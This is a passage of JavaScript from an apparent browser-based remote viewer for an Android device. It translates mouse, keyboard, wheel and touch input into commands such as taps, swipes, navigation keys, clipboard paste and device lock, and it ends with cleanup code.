              x2: pos.x, y2: pos.y, duration: 120,
            });
          }
        }, 80);
      }
    });
    c.addEventListener('mouseleave', () => { this._cursor = null; this._mouse.down = false; this._panning = false; });

    c.addEventListener('contextmenu', e => {
      e.preventDefault();
      const pos = this._mapCoords(e.clientX, e.clientY);
      this._cmd('LONG_PRESS', { x: pos.x, y: pos.y });
      this._ripple.spawn(pos.x, pos.y, true);
    });

    c.addEventListener('mousedown', e => {
      c.focus();
      if (e.button === 1 || (e.button === 0 && this._zoom > 1 && e.shiftKey)) {
        // Middle click or Shift+click when zoomed = pan mode
        e.preventDefault();
        this._panning    = true;
        this._panOrigin  = { x: e.clientX, y: e.clientY };
        this._panOriginVal = { ...this._pan };
        return;
      }
      if (e.button !== 0) return;
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(e.clientX, e.clientY);
      this._mouse.t      = performance.now();
    });

    c.addEventListener('mouseup', e => {
      if (this._panning) { this._panning = false; return; }
      if (!this._mouse.down) return;
      this._mouse.down = false;
      clearTimeout(this._holdScrollTimer);
      const up  = this._mapCoords(e.clientX, e.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        const isLong = dur >= 500;
        this._cmd(isLong ? 'LONG_PRESS' : 'TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._ripple.spawn(this._mouse.origin.x, this._mouse.origin.y, isLong);
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y,
          duration: Math.max(80, Math.min(Math.round(dur), 1500)),
        });
      }
    });

    c.addEventListener('wheel', e => {
      e.preventDefault();
      if (e.ctrlKey || e.metaKey) {
        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (e.deltaY < 0 ? 1.1 : 0.9)));
        this._applyTransform();
        const sl = this.container.querySelector('#_hv_zoom');
        const lb = this.container.querySelector('#_hv_zl');
        const pct = Math.round(this._zoom * 100);
        if (sl) sl.value = pct;
        if (lb) lb.textContent = pct + '%';
        return;
      }
      const pos   = this._mapCoords(e.clientX, e.clientY);
      const delta = e.deltaY > 0 ? 0.25 : -0.25;
      this._cmd('SWIPE', {
        x1: pos.x, y1: pos.y,
        x2: pos.x, y2: Math.max(0.01, Math.min(0.99, pos.y - delta)),
        duration: 200,
      });
    }, { passive: false });

    c.addEventListener('keydown', e => {
      e.preventDefault();
      if (e.key === '?') { this._toggleLegend(); return; }
      if (e.ctrlKey || e.metaKey) {
        switch (e.key.toLowerCase()) {
          case 'h': this._cmd('HOME', {});    return;
          case 'b': this._cmd('BACK', {});    return;
          case 'r': this._cmd('RECENTS', {}); return;
          case 'v':
            navigator.clipboard.readText().then(text => {
              if (text) { this._cmd('SET_CLIPBOARD', { text }); setTimeout(() => this._cmd('TYPE', { text }), 80); }
            }).catch(() => {});
            return;
          case 's': this.start();  return;
          case 'q': this.stop();   return;
          case 'c': this._cmd('LOCK_DEVICE', {}); return;
        }
      }
      switch (e.key) {
        case 'Escape':     this._cmd('BACK',            {}); return;
        case 'F1':         this._cmd('HOME',            {}); return;
        case 'F2':         this._cmd('RECENTS',         {}); return;
        case 'F3':         this._cmd('QUICK_SETTINGS',  {}); return;
        case 'F5':         this._cmd('FORCE_RESTART_VNC', {}); return;
        case 'Tab':        this._cmd('TYPE', { text: '\t' }); return;
        case 'Backspace':  this._cmd('TYPE', { text: '\b' }); return;
        case 'Enter':      this._cmd('TYPE', { text: '\n' }); return;
        case 'Delete':     this._cmd('TYPE', { text: '\x7f' }); return;
        case 'ArrowUp':    this._cmd('SWIPE', { x1:.5, y1:.65, x2:.5, y2:.3,  duration:200 }); return;
        case 'ArrowDown':  this._cmd('SWIPE', { x1:.5, y1:.3,  x2:.5, y2:.65, duration:200 }); return;
        case 'ArrowLeft':  this._cmd('SWIPE', { x1:.75,y1:.5,  x2:.2, y2:.5,  duration:200 }); return;
        case 'ArrowRight': this._cmd('SWIPE', { x1:.2, y1:.5,  x2:.75,y2:.5,  duration:200 }); return;
      }
      if (e.key.length === 1 && !e.ctrlKey && !e.altKey && !e.metaKey) {
        this._cmd('TYPE', { text: e.key });
      }
    });

    // Touch
    c.addEventListener('touchstart', e => {
      e.preventDefault();
      if (e.touches.length === 2) {
        this._pinch.active = true;
        this._pinch.dist   = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        this._pinch.midpoint = {
          x: (e.touches[0].clientX + e.touches[1].clientX) / 2,
          y: (e.touches[0].clientY + e.touches[1].clientY) / 2,
        };
        return;
      }
      const t = e.touches[0];
      this._mouse.down   = true;
      this._mouse.origin = this._mapCoords(t.clientX, t.clientY);
      this._mouse.t      = performance.now();
      c.focus();
    }, { passive: false });

    c.addEventListener('touchmove', e => {
      e.preventDefault();
      if (this._pinch.active && e.touches.length === 2) {
        const nd = Math.hypot(
          e.touches[0].clientX - e.touches[1].clientX,
          e.touches[0].clientY - e.touches[1].clientY
        );
        this._zoom = Math.max(0.5, Math.min(4, this._zoom * (nd / this._pinch.dist)));
        this._pinch.dist = nd;
        this._applyTransform();
      }
    }, { passive: false });

    c.addEventListener('touchend', e => {
      e.preventDefault();
      this._pinch.active = false;
      if (!this._mouse.down) return;
      this._mouse.down = false;
      const t   = e.changedTouches[0];
      const up  = this._mapCoords(t.clientX, t.clientY);
      const dur = performance.now() - this._mouse.t;
      const dx  = up.x - this._mouse.origin.x;
      const dy  = up.y - this._mouse.origin.y;

      if (Math.hypot(dx, dy) < SWIPE_THRESHOLD && dur < 500) {
        this._cmd('TAP', { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._ripple.spawn(this._mouse.origin.x, this._mouse.origin.y);
      } else if (Math.hypot(dx, dy) < SWIPE_THRESHOLD) {
        this._cmd('LONG_PRESS', { x: this._mouse.origin.x, y: this._mouse.origin.y });
        this._ripple.spawn(this._mouse.origin.x, this._mouse.origin.y, true);
      } else {
        this._cmd('SWIPE', {
          x1: this._mouse.origin.x, y1: this._mouse.origin.y,
          x2: up.x, y2: up.y, duration: Math.max(80, Math.round(dur)),
        });
      }
    }, { passive: false });
  }

  // ── Resize ────────────────────────────────────────────────────────────────
  onResize() { if (this._lyReader) this._lyReader.onResize(); }

  // ── Destroy ───────────────────────────────────────────────────────────────
  destroy() {
    this.stop();
    if (this._recording) this._recorder?.stop();
    if (this._lyReader)  { this._lyReader.destroy(); this._lyReader = null; }
    cancelAnimationFrame(this._rafId);
    clearInterval(this._qaTimer);
    clearInterval(this._hudTimer);
    clearTimeout(this._holdScrollTimer);
    if (this._pending) { this._pending.close(); this._pending = null; }
    this._pool.destroy();
  }
}
